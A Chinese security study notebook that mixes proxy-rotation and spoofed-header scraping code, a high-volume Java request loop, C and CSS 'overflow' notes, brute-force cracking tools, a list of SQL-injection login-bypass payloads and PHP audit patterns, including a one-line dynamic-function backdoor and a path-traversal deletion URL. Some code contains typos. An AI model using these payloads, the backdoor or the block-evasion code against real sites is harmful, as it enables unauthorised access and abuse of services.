在爬虫过程中，如果长时间频繁的使用同一个ip地址访问某个网站和提取内容，就很容易让对方网站识别认定为爬虫，从而对你的爬虫行为做出相应的限制，或直接屏蔽你的ip地址访问，因此使用多个ip地址进行访问，可以有效解决这一问题

整体思路：建立一个存放ip地址的列表，包含多个可用的ip地址(大家可以网上搜免费ip地址0)，然后每次都随机调用一个ip地址，建立http连接，这样就避免了同一个ip地址多次访问被屏蔽的风险了

代码

```python
from urllib import request
import random
proxy_list = [
  {"http":"124.88.67.54:80"},
  {"http":"61.135.217.7:80"},
  {"http":"42.231.165.132:8118"}
]
proxy = random.choice(proxy_list)# 随机选择一个ip地址
httpproxy_handler = request.ProxyHandler(proxy)
opener = request.build_opener(httpproxy_handler)
request = request.Request("http://www.baidu.com/")
response =opener.open(request)
print(response.read())
```

Java模拟多IP访问

```java
package url_demo;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;
import java.util.Random;

public class HttpUtilTest 
{

    private int index = 0;

    public String sendPost(String url, String param) 
	{
        PrintWriter out = null;
        BufferedReader in = null;
        String result = "";
        try 
		{
            URL realUrl = new URL(url);
            URLConnection conn = realUrl.openConnection();

            // 随机生成ip
            String ip = randIP();
            conn.setRequestProperty("X-Forwarded-For", ip);
            conn.setRequestProperty("HTTP_X_FORWARDED_FOR", ip);
            conn.setRequestProperty("HTTP_CLIENT_IP", ip);
            conn.setRequestProperty("REMOTE_ADDR", ip);
            conn.setRequestProperty("Host", "");
            conn.setRequestProperty("Connection", "keep-alive");
            conn.setRequestProperty("Content-Length", "17");
            conn.setRequestProperty("Accept", "application/json");
            conn.setRequestProperty("Origin", "ORIGIN");
            conn.setRequestProperty("User-Agent",
                    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Referer", "REFERER");
            conn.setRequestProperty("Accept-Encoding", "gzip, deflate");
            conn.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,pt;q=0.2");

            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            out.print(param);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) 
			{
                result += line;
            }
            synchronized (this) 
			{
                DemoUtl.index = DemoUtl.index + 1;
            }
            System.out.println("第" + DemoUtl.index + "次访问； -->  || 当前线程：" + param + "  || 请求成功！ || 模拟ip: " + ip
                    + " || 返回结果： " + result.toString().hashCode());
        } 
		catch (Exception e) 
		{
            // System.out.println("发送 POST 请求出现异常！" + e);
            // e.printStackTrace();
        } 
		finally 
		{
            try 
			{
                if (out != null) 
				{
                    out.close();
                }
                if (in != null) 
				{
                    in.close();
                }
            } 
			catch (IOException ex) 
			{
                ex.printStackTrace();
            }
        }
        return result;
    }

    public static String randIP() 
	{
        Random random = new Random(System.currentTimeMillis());
        return (random.nextInt(255) + 1) + "." + (random.nextInt(255) + 1) + "." + (random.nextInt(255) + 1) + "."
                + (random.nextInt(255) + 1);
    }
}
```

```java
package url_demo;

import java.util.Random;

public class DemoUtl 
{

    public static int index = 0;

    public static void main(String[] args) throws InterruptedException 
	{
        try 
		{
            for (int i = 0; i < 100000; i++) 
			{
                Thread.sleep((new Random()).nextInt(200) + 100);
                new Thread(new Runnable() 
				{
                    @Override
                    public void run() 
					{
                    
                        for (int j = 0; j < 100000; j++) 
						{
                            try 
							{
                                Thread.sleep((new Random()).nextInt(3200) + 1500);
                                HttpUtilTest tt = new HttpUtilTest();
                                tt.sendPost(
                                        "https://www.baidu.com",
                                        Thread.currentThread().getName());
                            } 
							catch (InterruptedException e) 
							{
                                e.printStackTrace();
                            }
                        }
                    }
                }).start();
            }
        } 
		catch (Exception e) 
		{
            e.printStackTrace();
        }
    }
}
```

### <font color="yellow">13 溢出</font>

#### <font color="yellow">001 基本数据类型</font>

- 整型
- 浮点型

整型包括

- char
- short
- int
- long
- long long

除此之外，整型还有无符号类型unsigned...

浮点型包括

- float
- double
- long double

规则

- `short`至少16位，`int`至少和`short`一样长
- `long`至少32位，至少和`int`一样长
- `long long`至少64位，至少和`long`一样长
- `float`至少4个字节
- `double`至少6个字节，并且不少于`float`
- `long double`至少和`double`一样长

#### <font color="yellow">002 数据范围</font>

不同的系统环境，数据范围有所不同；32位/64位操作系统，数据范围也有所不同，可以通过代码来确定不同的范围

- c语言定义了一系列的宏

	```C
	#include <stdio.h>
	#include <limits.h>

	int main()
	{
	    printf("max integer: %d\n", INT_MAX);
	    printf("min integer: %d\n", INT_MIN);
	    return 0;
	}
	```

- C++数值极限

	```C++
	#include <iostream>
	#include <limits>

	int main()
	{
	    std::cout << numeric_limits<int>::max() << endl;
	    std::cout << numeric_limits<int>::min() << endl;
	    return 0;
	}
	```

#### <font color="yellow">003 数据类型应用</font>

介绍个亲身遇到的数据溢出的问题：数据压缩后还原导致溢出

```C
int d = 0;
long value = d * 1000 + 10;
```

上面一段代码就有发生数据溢出的可能，当变量d足够大时，再乘以1000就会溢出。结果可想而知，是一个相对小的数值

```C
//可以这样改写，就不会出现问题
long value = (long)d * 1000 + 10;
```

C/C++基本数据类型，每一种都有范围，在选择数据类型要注意合适的范围，否则会造成数据溢出，产生难以发现的bug

#### <font color="yellow">004 CSS方式</font>

##### <font color="yellow">0001 单行溢出</font>

```html
<!DOCTYPE html>
<html>
	<head> 
		<meta charset="utf-8">
		<title>text-overflow</title>
			<style type="text/css">
				.test_demo{
				    text-overflow:ellipsis;//值为clip表示剪切，ellipsis时为显示省略号
				    overflow:hidden; 
				    white-space:nowrap; 
				    width:200px; 
				    background:#ccc;
				}
			</style>
	</head> 
	<body>
		<div class="test_demo">
			超酷的IT技术学习平台（我是省略号）
		</div>
	</body>
</html>
```

同时，`word-wrap`也可以用来设置文本行为，当前行超过指定容器的边界时是否断开转行

##### <font color="yellow">0002 多行溢出</font>

针对webkit内核的浏览器以及Opera浏览器

```html
<!DOCTYPE html>
<html>
	<head> 
		<meta charset="utf-8">
		<title>text-overflow</title>
		<style type="text/css">
		.test_demo{ 
		    text-overflow:ellipsis;  
		    overflow:hidden; 
		    width:200px; //指定宽度
		    background:#ccc;  
		    display:-webkit-box;  
		    -webkit-box-orient:vertical;  
		    -webkit-line-clamp:3; //指定显示多少行
		}
	</style>
</head> 
<body>
	<div class="test_demo">
		超酷的IT技术学习平台，我是省略号术学习平台，我是省略号我是省略号术学习平台，我是省略我是省略号术学习平台，我是省略
	</div>
</body>
</html>
```

对于其他浏览器：比较靠谱简单的做法就是设置相对定位的容器高度，用包含省略号(…)的元素模拟实现

```css
p 
{
　　position: relative;
　　line-height: 1.4em;
　　height: 4.2em;
　　overflow: hidden;
}
p::after 
{
　　content: "...";
　　font-weight: bold;
　　position: absolute;
　　bottom: 0;
　　right: 0;
　　padding: 0 20px 1px 45px;
　　background: url(http://css88.b0.upaiyun.com/css88/2014/09/ellipsis_bg.png) repeat-y;
}
```

这里注意几点

- `height`高度正好是`line-height`的3倍
- 结束的省略好用了半透明的png做了减淡的效果，或者设置背景颜色
- IE6-7不显示content内容，所以要兼容IE6-7可以是在内容中加入一个标签，比如用…去模拟
- 要支持IE8，需要将`::after`替换成`:after`

##### <font color="yellow">0003 js插件方式</font>

更为好用的是使用jQuery插件-`jQuery.dotdotdot`

```javascript
$('.news-left-text').dotdotdot();//先要引入jquery.dotdotdot.js，然后选择文本段落，使用dotdotdot方法
```

### <font color="yellow">14 暴力破解</font>

暴力破解攻击是最流行的密码破解方法之一，然而，它不仅仅是密码破解，暴力攻击还可用于发现Web应用程序中的隐藏页面和内容，在你成功之前，这种攻击基本上是攻击一次尝试一次，暴力破解是最流行的密码破解方法之一，然而，它不仅仅是密码破解，暴力破解还可用于发现Web应用程序中的隐藏页面和内容，在你成功之前，这种破解基本上是破解一次尝试一次，这种破解有时需要更长的时间，但其成功率也会更高，在本文中，我将尝试解释在不同场景中使用的暴力破解和流行工具，来执行暴力破解并获得所需结果，其实做为一个开发者，有一个学习的氛围跟一个交流圈子特别重要这里我推荐一个开发交流群664389243，不管你是小白还是大牛欢迎入驻，大家一起交流成长

#### <font color="yellow">001 简介</font>

当攻击者使用一组预定义值攻击目标并分析响应直到他成功，这就叫做暴力攻击，它的成功取决于预定义值的集合，如果它越大，就会需要更多时间，但成功的可能性也会变大，最常见且最容易理解的暴力攻击是破解密码的字典攻击，在这种情况下，攻击者使用包含数百万个可作为密码的单词的密码字典，然后攻击者逐个尝试这些密码并进行身份验证，如果字典中包含正确的密码，攻击者将会成功，在传统的暴力攻击中，攻击者只是尝试字母和数字的组合来顺序生成密码，但是，当密码足够长的时候，这种技术就会需要更长的时间，这些攻击可能需要几分钟到几小时甚至是几年的时间，具体取决于所使用的系统和密码的长度，为了防止暴力破解密码，应始终使用长而复杂的密码，这会使得攻击者很难猜到密码，暴力攻击会花费更多的时间，大多数时候，WordPress用户面临对其网站的暴力攻击，帐户锁定是防止攻击者对Web应用程序执行暴力攻击的一种方法，但是，对于离线软件，事情就没这么简单了，为了发现隐藏页面，攻击者会尝试猜测页面名称，发送请求并查看响应，如果该页面不存在，它将显示响应404，成功的话就会响应200，这样，它可以在任何网站上找到隐藏页面，暴力攻击也用于破解散列并从给定散列中猜出密码，这样的话，哈希是从随机密码生成的，然后此哈希与目标哈希匹配，直到攻击者找到正确的哈希，因此，用于加密密码的加密类型(64位、128位或256位加密)越高，暴力破解所需的时间就会越长

#### <font color="yellow">002 逆向暴破</font>

逆向暴力攻击是另一个与密码破解相关的术语，破解密码采用相反的方法，攻击者针对多个用户名尝试一个密码，想想你是否有知道密码但是不知道用户名的时候，在这种情况下，你可以尝试使用相同的密码去猜测不同的用户名，直到找到匹配组合，现在，您知道暴力攻击主要用于密码破解，您可以在任何软件，任何网站或任何协议中使用它，只要目标在几次无效尝试后不会组织请求就行

#### <font color="yellow">003 工具</font>

##### <font color="yellow">0001 Aircrack-NG</font>

这是一款免费的无线密码破解工具，该工具附带WEP/WPA/WPA2-PSK破解程序和分析工具，可对WiFi 802.11进行攻击，Aircrack-ng可用于任何支持监听模式的网卡，它基本上是采用密码字典攻击来猜测无线密码，如您所知，攻击的成功取决于密码字典，密码字典越好越有效，它适用于Windows和Linux平台，它也被移植到iOS和Android平台上运行，您可以尝试使用给定的平台来研究此工具的工作原理

##### <font color="yellow">0002 John the Ripper</font>

开膛手约翰也是一款几乎人人皆知的工具，它长期以来一直是进行暴力攻击的最佳选择，这个免费的密码破解工具最初是为Unix系统开发的，后来，开发人员又为其他平台发布了这款工具，现在它支持15种不同的平台，包括Unix\Windows、DOS、Linux、BeOS和OpenVMS等，您可以使用它来识别弱密码或破解密码来通过身份验证，这款工具非常受欢迎，并结合了各种密码破解功能，它可以自动检测密码中使用的哈希类型，因此，您也可以针对加密密码存储运行它，基本上，它可以通过组合字母和数字对所有可能的密码执行暴力破解，但是您也可以将其与密码字典一起使用来执行字典攻击

##### <font color="yellow">0003 Rainbow Crack</font>

Rainbow Crack也是一款用于密码破解的流行工具，它会生成彩虹表，以便在执行攻击时使用，这也使得它与其他的暴力破击工具不同，彩虹表是预先计算的，它有助于减少执行攻击的时间，幸运的是，有各种组织已经为所有互联网用户发布了前计算机的彩虹表，为了节省时间，您可以下载这些彩虹表并在攻击中使用，该工具仍然在积极开发中，它适用于Windows和Linux，并支持这些平台的所有最新发行版

##### <font color="yellow">0004 Cain & Able</font>

同样也是一款热门的工具，它可以通过执行暴力攻击、字典攻击和密码分析攻击来帮助破解各种密码，密码分析攻击是通过使用前一种工具中提到的彩虹表来完成的，值得一提的是，一些病毒查杀软件会将其检测为恶意软件，Avast和Microsoft Security Essentials将其报告为恶意软件并会组织它的运行，如果您需要使用这款软件，您需要先和您的杀毒软件打好招呼

它的基本功能是

- 嗅探网络
- 使用字典破解加密密码
- 暴力和密码分析攻击
- 录制VoIP会话
- 解码加密密码
- 恢复无线网络密钥
- 揭示密码框
- 发现缓存中的密码
- 分析路由协议

该工具的最新版本具有很多功能，并添加了嗅探来执行中间人攻击

##### <font color="yellow">0005 L0phtcrack</font>

L0phtCrack以破解Windows密码的能力而闻名，它使用字典、暴力破解、混合攻击和彩虹表，L0phtCrack最显著的特性是调度、64位Windows版本的哈希提取、多处理器算法以及网络监控和解码，如果要破解Windows系统的密码，可以尝试使用此工具

##### <font color="yellow">0006 Ophcrack</font>

Ophcrack是另一款专门用于破解Windows密码的暴力破解工具，它通过彩虹表使用LM哈希来破解Windows密码，它是一款免费的开源工具，在大多数情况下，它可以在几分钟内破解Windows密码，默认情况下，Ophcrack附带的彩虹表能够破解少于14个字符的密码，其中只包含字母数字字符，其他彩虹表也可供下载，Ophcrack还可用作LiveCD

##### <font color="yellow">0007 Crack</font>

Crack是一款古老的密码破解工具，它是Unix系统的密码破解工具，用于通过执行字典攻击来检查弱密码

##### <font color="yellow">0008 Hashcat</font>

Hashcat号称是最快的基于CPU的密码破解工具，它是免费的，适用于Linux、Windows和Mac OS平台，Hashcat支持各种散列算法，包括LM Hashes、MD4、MD5、SHA系列、Unix Crypt格式、MySQL、Cisco PIX，它支持各种攻击形式，包括暴力破解、组合攻击、字典攻击、指纹攻击、混合攻击、掩码攻击、置换攻击、基于规则的攻击、表查找攻击和Toggle-Case攻击

##### <font color="yellow">0009 SAMInside</font>

SAMInside同样专门用于破解Windows操作系统的密码，它类似于Ophcrack和Lophtcrack工具，它声称在一台电脑上最高可以每秒破解大约1000万个密码，它支持各种攻击方法，包括掩码攻击、字典攻击、混合攻击和彩虹表攻击，它支持400多种哈希算法

##### <font color="yellow">0010 DaveGrohl</font>

DaveGrohl是适用于Mac OS X的流行破解工具，它支持所有可用版本的Mac OS X，此工具支持字典攻击和增量攻击，它还具有分布式模式，允许您从多台计算机执行攻击以攻击相同的密码哈希，此工具现在是开源的，您可以从源码进行安装

##### <font color="yellow">0011 Ncrack</font>

Ncrack用于破解网络身份验证，它支持各种协议，包括RDP、SSH、HTTP(S)、SMB、POP3(S)、VNC、FTP和telnet，它可以执行不同的攻击，包括暴力破解等，支持包括Linux、BSD、Windows和Mac OS X等操作系统

##### <font color="yellow">0012 THC Hydra</font>

九头蛇以其通过执行暴力攻击来破解网络身份验证的能力而闻名，它可对多种协议执行字典攻击，包括telnet、FTP、HTTP、HTTPS、SMB等，它适用于多种平台，包括Linux、Windows、Cygwin、Solaris、FreeBSD、OpenBSD、OSX和QNX/BlackBerry等，这些都是用于密码破解的流行工具，还有各种其他工具可用于对不同类型的身份验证执行暴力破解，如果我只举几个小工具的例子，你会看到大多数PDF破解、ZIP破解工具使用相同的暴力破解方法来执行攻击，有许多此类工具可免费或付费使用

#### <font color="yellow">004 总结</font>

暴力破解是破解密码最常用的方法，攻击的成功取决于各种因素，但是，影响最多的因素是密码的长度以及数字、字母和特殊字符的组合，这就是我们谈论强密码的原因：我们通常建议用户使用小写字母、大写字母、数字和特殊字符组合的长密码，它不会使得暴力破解不可能，但会让其变得十分困难，这样，暴力破解会需要更长的时间来破解密码，几乎所有的散列破解算法都使用暴力破解来尝试，当您对数据进行脱机访问时，此攻击最佳，在这种情况下，它易于破解，而且会花费更少的时间，暴力密码破解在计算机安全性方面非常重要，它用于检查系统、网络或应用程序中使用的弱密码，防止暴力攻击的最佳方法是限制无效登录，通过这种方式，攻击只能在有限的时间点击并尝试密码，这就是为什么基于网络的服务开始使用验证码，如果您三次输入错误的密码他们会对您的IP地址进行屏蔽

### <font color="yellow">15 万能密码</font>

#### <font color="yellow">001 SQL万能密码</font>

- `admin' or 1=1#`
- `'or 1=1`
- `"or "a"="a`
- `"or 1=1--`
- `"or"="`
- `"or"="a'='a`
- `"or1=1--`
- `"or=or"`
- `''or'='or'`
- `') or ('a'='a`
- `'.).or.('.a.'='.a`
- `'or 1=1`
- `'or 1=1--`
- `'or 1=1/*`
- `'or"="a'='a`
- `'or' '1'='1'`
- `'or''='`
- `'or''=''or''='`
- `'or'='1'`
- `'or'='or'`
- `'or.'a.'='a`
- `'or1=1--`
- `1'or'1'='1`
- `a'or' 1=1--`
- `a'or'1=1--`
- `or 'a'='a'`
- `or 1=1--`
- `or1=1-- `

#### <font color="yellow">002 asp/aspx万能密码</font>

- `"or "a"="a`
- `'.).or.('.a.'='.a`
- `or 1=1--`
- `'or 1=1--`
- `a'or' 1=1--`
- `"or 1=1--`
- `'or.'a.'='a`
- `"or"="a'='a`
- `'or''='`
- `or'='or' `

#### <font color="yellow">003 javascript万能密码</font>

- `1'or'1'='1`
- `admin' or 1=1`

### <font color="yellow">16 代码审计</font>

[http://www.freebuf.com/sectool/101256.html](http://www.freebuf.com/sectool/101256.html)

[https://www.owasp.org/index.php](https://www.owasp.org/index.php)

[https://www.dwheeler.com/essays/static-analysis-tools.htm](https://www.dwheeler.com/essays/static-analysis-tools.htm)

[https://www.dwheeler.com/essays/static-analysis-tools.html](https://www.dwheeler.com/essays/static-analysis-tools.html)

[https://github.com/mre/awesome-static-analysis](https://github.com/mre/awesome-static-analysis)

[https://en.wikipedia.org/wiki/List_of_tools_for_static_code_analysis](https://en.wikipedia.org/wiki/List_of_tools_for_static_code_analysis)

[https://www.dwheeler.com/secure-programs/3.71/Secure-Programs-HOWTO/index.html](https://www.dwheeler.com/secure-programs/3.71/Secure-Programs-HOWTO/index.html)

#### <font color="yellow">001 PHP代码审计</font>

RIPS开源

> 一款开源的，具有较强漏洞挖掘能力的自动化代码审计工具，它使用PHP语言编写的，用于静态审计PHP代码的安全性
> 
> 代码安全审计RIPS的主要功能特点如下
> 
> - 能够检测XSS、SQL注入、文件泄露、本地/远程文件包含、远程命令执行以及更多种类型的漏洞
> - 有5种级别选项用于显示以及辅助调试扫描结果
> - 标记存在漏洞的代码行
> - 对变量高亮显示
> - 在用户定义函数上悬停光标可以显示函数调用
> - 在函数定义和调用之间灵活跳转
> - 详细列出所有用户定义函数(包括定义和调用)、所有程序入口点(用户输入)和所有扫描过文件(包括include的文件)
> - 以可视化的图表展示源代码文件、包含文件、函数及其调用
> - 仅用几个鼠标点击就可以使用CURL创建针对检测到漏洞的EXP实例
> - 详细列出每个漏洞的描述、举例、PoC、补丁和安全函数
> - 7种不同的语法高亮显示模式
> - 使用自顶向下或者自底向上的方式追溯显示扫描结果
> - 一个支持PHP的本地服务器和浏览器即可满足使用需求
> - 正则搜索功能
> 
> 当前有商业版，但开源已经够用了，最新版本的RIPS是0.55[https://sourceforge.net/projects/rips-scanner/](https://sourceforge.net/projects/rips-scanner/)

#### <font color="yellow">002 Java代码审计</font>

代码质量：findbugs

代码安全：findsecuritybugs 

FindSecurityBugs是Java静态分析工具FindBugs的插件，通过一系列的规则发现代码中的Java安全漏洞，这个工具可以集成在很多IDE中，包括Eclipse或IntelliJ，目前这个项目已经在安全社区中获得了不少关注度，该工具的最新版本还增加了专门针对Android端产品的漏洞类型，因此，它也是一个不错的移动端安全扫描工具

如果你想更详细的了解它，可以去访问

[http://findbugs.sourceforge.net/downloads.html](http://findbugs.sourceforge.net/downloads.html)

[https://www.jianshu.com/p/c43940c4e025](https://www.jianshu.com/p/c43940c4e025)

[https://find-sec-bugs.github.io/](https://find-sec-bugs.github.io/)

[https://wiki.jenkins.io/display/JENKINS/FindBugsPlugin](https://wiki.jenkins.io/display/JENKINS/FindBugsPlugin)

#### <font color="yellow">003 其他语言代码审计</font>

##### <font color="yellow">0001 net</font>

[https://security-code-scan.github.io/](https://security-code-scan.github.io/)

##### <font color="yellow">0002 C++</font>

代码质量：cppcheck

代码安全：flawfinder

[https://sourceforge.net/projects/flawfinder/](https://sourceforge.net/projects/flawfinder/)

[http://www.doc88.com/p-669125880049.html](http://www.doc88.com/p-669125880049.html)

[https://sourceforge.net/p/flawfinder/feature-requests/4/](https://sourceforge.net/p/flawfinder/feature-requests/4/)（xml格式支持）

##### <font color="yellow">0003 JS</font>

代码质量：eslint

[https://github.com/ajinabraham/NodeJsScan](https://github.com/ajinabraham/NodeJsScan)

[https://blog.csdn.net/yalishandalee/article/details/61916454](https://blog.csdn.net/yalishandalee/article/details/61916454)

[https://github.com/nodesecurity/eslint-plugin-security#rules](https://github.com/nodesecurity/eslint-plugin-security#rules)

##### <font color="yellow">0004 Go</font>

代码质量：golint

代码安全：gas

[https://github.com/GoASTScanner/gas](https://github.com/GoASTScanner/gas)

##### <font color="yellow">0005 Python</font>

代码质量：pylint

代码安全：bandit    py-find-injection    pyt

[https://wiki.openstack.org/wiki/Security/Projects/Bandit](https://wiki.openstack.org/wiki/Security/Projects/Bandit)

[https://github.com/openstack/bandit](https://github.com/openstack/bandit)

[https://github.com/uber/py-find-injection](https://github.com/uber/py-find-injection)

[https://github.com/bit4woo/python_sec](https://github.com/bit4woo/python_sec)

[https://github.com/python-security/pyt](https://github.com/python-security/pyt)

##### <font color="yellow">0006 多种语言的安全代码检查工具</font>

sonar

[https://docs.sonarqube.org/display/SONAR](https://docs.sonarqube.org/display/SONAR)

[https://www.sonarsource.com/products/codeanalyzers/sonarjava/rules.html#Vulnerability_Detection](https://www.sonarsource.com/products/codeanalyzers/sonarjava/rules.html#Vulnerability_Detection)

[https://github.com/SonarSource/sonarqub](https://github.com/SonarSource/sonarqub)

##### <font color="yellow">0007 ruby</font>

[https://github.com/thesp0nge/dawnscanner](https://github.com/thesp0nge/dawnscanner)

[https://github.com/presidentbeef/brakeman](https://github.com/presidentbeef/brakeman)

#### <font color="yellow">004 商业代码审计工具</font>

其实网上都说烂了，静态分析的工具RISP，VCG，Fortify SCA等，动态工具有360的sky wolf，鸟哥的taint

静态分析还有几个[https://github.com/wufeifei/cobra](https://github.com/wufeifei/cobra)

这是一个简单的通过正则查找漏洞的工具[https://grepbugs.com/](https://grepbugs.com/)

taint只支持php5.4.*及以前的版本，最新的php是不支持的

#### <font color="yellow">005 代码审计入门</font>

##### <font color="yellow">0001 整体</font>

学习代码审计的目标是能够独立完成对一个CMS的代码安全监测

其通用的思路有

- 通读全文代码，从功能函数代码开始阅读，例如`include`文件夹下的`common_fun.php`，或者有类似关键字的文件
- 看配置文件，带有`config`关键字的文件，找到`mysql.class.php`文件的`connect()`函数，查看在数据库连接时是否出现漏洞
- 继续跟读首页文件，`index.php`，了解程序运作时调用了哪些函数和文件以`index.php`文件作为标线，一层一层去扩展阅读所包含的文件，了解其功能，之后进入其功能文件夹的首页文件，进行扩展阅读

##### <font color="yellow">0002 漏洞</font>

###### <font color="yellow">a. 文件操作漏洞</font>

能不用文件名参数就不用尽量不要让用户可控，平行用户的权限管理员的权限操作权限，禁止传入参数类似于这种`..`、`/`、`\`检查传入的参数，做出限制，停止程序往下执行

文件包含漏洞

> 1. 本地文件包含
> 
>   一般存在于模块加载，模板加载，cache调用包括函数
> 	
>   `include()/include_once()`
> 	
>   `require()/require_once()`
> 
> 	寻找可控变量
> 
>   1. php
> 
> 		```php
> 		<?php
> 			dirfine("ROOT",dirname(__FILE__).'/');
> 			$mod = $_GET('mod');
> 			include(ROOT.$mod.'.php');
> 		?>
> 		```
> 	2. php
> 	
>   	```php
> 		<?php phpinfo() ?>
> 		```
> 
> 2. 远程文件包含
> 
>   前提条件`allow_url_include = on`
> 
>   出现频率不如本地包含
> 
> 3. 文件包含截断
> 
>   `%00`截断(php版本5.3)
>   
>   `？`截断(问好后面相当于请求到参数，伪截断)
>   
>   英文(`.`)反斜杠(`/`)截断

文件读取(下载)漏洞

> 搜索关键函数
> 
> - `file_get_contents()`
> - `highlight_file()`
> - `fopen()`
> - `read file()`
> - `fread()`
> - `fgetss()`
> - `fgets()`
> - `parse_ini_file()`
> - `show_source()`
> - `file()`

文件上传漏洞

> 搜索关键函数：`move_uploaded_file()`接着看调用这个函数的代码是否存在为限制上传格式或者可以绕过
> 
> 未过滤或本地过滤：服务器端未过滤，直接上传PHP格式的文件即可利用
> 
> 黑名单扩展名过滤：限制不够全面
> 
> IIS默认支持解析`.asp`、`.cdx`、`.asa`、`.cer`等
> 
> 扩展名可绕过
> 
> ```php
> <?php
> 	function getExt($filename)
> 	{
> 		return substr($file,strripos($filename,'.')+1);
> 	}
> 	$disallowed_types = array("php","asp","aspx");
> 	$filenameExt = strtolower(getExt($_FILES['file']['name']));
> 	if(in_array($filenameExt,$disallowed_types))
> 	{
> 		die("disallow type");
> 	}
> 	else
> 	{
> 		$filename = time().".".$filenameExt;
> 		move_uploaded_file($_FILES['file']['temp'],'upload/'.$filename);
> 	}
> ?>
> ```
> 
> 不被允许的文件格式`.php`，但是我们可以上传文件名为`1.php`(注意后面有一个空格)
> 
> 文件头`content-type`验证绕过
> 
> - getimagesize()函数
> 
> 	验证文件头只要为GIF89a，就会返回真
> 
> - 限制$_FILES["file"]["type"]的值就是人为限制content-type为可控变量
> 
> 防范
> 
> 使用`in_array()`或利用三等于`===`对比扩展名，保存上传文件是重命名，规则采用时间戳拼接随机数`md5(time() + rand(1,1000))`

文件删除漏洞

> 1. 搜索关键函数
> 
>   `unlink()`利用回溯变量的方式
> 
>   老版本下的`session_destroy()`，可以删除文件，现已基本被修复
> 
> 2. `Metinfo`的任意文件删除漏洞
> 
>   ```php
> 	<?php
> 		$action = $_GET['action'];
> 		$filename = $_GET['filename'];
> 		if($action = "delete") {
> 			if(is_array($filenames)) {
> 				foreach($filenames as $filename) {
> 					unlink('../../databack'.$filename)；
> 				}
> 			}
> 		}
> 		else {
> 			if(fileext($filenames) == "sql") {
> 				$filenamearray = explode(".sql",$filename);
> 				unlink('../../databack'.$filename);
> 				unlink('../../databack/sql/metinfo_'.$filenamearray[0].'zip');
> 			} 
> 			elae {
> 				unlink('../../databack/'.$fileon.'/'.$filename);
> 			}
> 		}
> 	?>
> 	```
> 
>   `$action = delete`即可删除`.sql`的文件，如果文件不是`sql`直接删除提交的文件名
> 
>   `target.com/recovery.php?&action=delete&filename=../../index.php`

###### <font color="yellow">b. 代码执行漏洞</font>

代码执行函数

> 1. 搜索关键函数
> 
> - `eval()`
> - `assert()`
> - `preg_replace()`
> - `call_user_func()`
> - `call_user_func_array()`
> - `array_map()`
> 
> 2. `preg_replace()`函数
> 
> `mixed preg_replace(mixed $pattern,mixed $replacement,mixed $subject[, int $limit = -1[, int &$count]])`
> 
> <font color="red">当`$pattern`处存在`e`修饰符时，`$replacement`会被当做php代码执行</font>
> 
> 3. `mixed call_user_func(callable $callbank[`, `mixed $parameter[`, `mixed$…)`
> 
> <font color="red">第一个参数为回调函数，第二个参数是回调函数的参数</font>
> 
> ```php
> <?php
> 	$b = "phpinfo()";
> 	call_user_func($_GET['a'],$b);
> ?>
> ```
> 
> 4. `eval()`和`assert()`
> 
> <font color="red">当`assert()`的参数为字符串时，可执行PHP代码</font>
> 
> - `eval("phpinfo();"); = False`
> - `eval("phpinfo()"); = True`
> - `assert("phpinfo();"); = True`
> - `assert("phpinfo()"); = False`

动态函数运行

> 1. 动态函数后门
> 
> ```php
> #!php
> <?php
> 	$_GET['a']($_GET['b']);
> ?>
> ```
> 
> 2. 命令执行函数
> 
> 搜索关键函数
> 
> > - system()
> > - exec()
> > - shell_exec()
> > - passthru()
> > - pcntl_exec()
> > - popen()
> > - proc_open()
> 
> `popen`和`proc_open()`
> 
> > ```php
> > #!php
> > <?php 
> > 	popen('whoami>>/Users/bingdaojueai/Desktop/1.txt','r');
> > ?>
> > ```
> > 
> > 所在路径就会出现一个1.txt里面的内容为命令执行后的结果
> 
> 反引号命令执行
> 
> > ```php
> > echo …
> > ```
> > 
> > 双引号和单引号的区别
> > 
> > ```php
> > #!php
> > $a = 1
> > echo "$a" = output:1
> > echo '$a' = output:$a
> > ```
> > 
> > <font color="red">双引号时，可以直接解析变量，造成代码执行漏洞，google绕过</font>

变量覆盖漏洞

> 1. 函数使用不当
> 
> `int extract(array &$var_array,int $extract_type = EXTR_OVERWRITE,string $prefix = null)`
> `void parse_str(string $str,array &$arr)`
> `bool import_request_variables(string $type,string $prefix)`
> 
> 2. `$$`变量覆盖
> 
> ```php
> <?php
> $a = 1;
> foreach(array("_COKKIE","POST","GET") as $_request) {
> 	foreach($$_request as $_key => $value) {
> 		echo $_key."<br>";
> 		$$_key = addslashes($value);
> 	}
> }
> echo $a;
> ?>
> ```

逻辑漏洞

> 需要思考的问题
> 
> - 程序是否可以重复安装
> - 修改密码是否存在越权修改其他用户密码
> - 找回密码验证码是否可以暴力破解
> - cookie是否可以预测验证存在绕过
> 
> 1. 等于与存在判断绕过
> 
> > 1. `in_array()`
> >     
> >     <font color="red">比较之前会自动转换类型</font>
> >     
> >     ```php
> > 	<?php
> > 		if(in_array($_GET['type_id'],array(1,2,3,4))) {
> > 			$sql = "SELECT ... WHERE type_id = '".$_GET['type_id']."'";
> > 		}
> > 	?>
> > 	```
> > 
> > 2. `is_numeric()`
> > 	
> >     <font color="red">当传入参数为hex时直接通过并返回true并且MYSQL可以直接使用hex编码代替字符串明文可以二次注入并且可能造成XSS漏洞</font>
> > 
> > 3. 双等于`==`和三等于`===`
> >     
> > 	双等于会在变量比较时，进行类转换，与`in_array()`是一样的问题
> > 	
> >     三等于是type和value的双重比较，相比之下更加安全
> 
> 2. 账户体系中的越权问题
> 
> > - 水平越权
> >     
> >    	A用户能够以B用户的身份，进行B用户的全部权限操作，前提A用户和B用户拥有相同的权限
> >     
> > - 垂直越权
> >     
> > 	A用户能够以C用户的身份，进行C用户的全部权限操作，前提C用户比A用户拥有更高的权限
> > 
> > 1. 未exit/return/die
> > 	```php
> > 	#!php
> > 	<?php
> > 		if(file_exists(install.lock)) {
> > 			header("Location:xxx.com");
> > 			//exit();
> > 		}
> > 		echo "test";
> > 	?>
